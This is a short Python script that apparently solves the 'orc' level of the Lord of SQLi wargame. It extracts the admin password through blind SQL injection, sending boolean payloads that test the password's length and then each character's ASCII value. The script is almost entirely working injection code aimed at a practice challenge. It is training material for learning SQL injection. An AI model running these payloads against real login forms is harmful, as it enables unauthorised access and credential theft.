from requests import get

url ="https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
cookie = {"PHPSESSID":"c0bed5cfkoofgp0l3nfhdr2c89"}
i = 0
while True:
    params = {
        'pw':f"'||id='admin'&&length(pw)={i}#"
    }
    html = get(url,params=params,cookies=cookie).text
    i+=1
    if html.find("Hello admin") > 0:
        break
pw = ""
for i in range(1,i):
    for j in range(30,128):
        params = {
            'pw':f"'||id='admin'&&ASCII(mid(pw,{i},1))={j}#"
        }
        html = get(url,params=params,cookies=cookie).text
        if html.find("Hello admin") > 0:
            pw += chr(j)
            break
params = {
    'pw':pw
}
if get(url,params=params,cookies=cookie).text.find("Clear!") > 0:
    print("[*] Success")
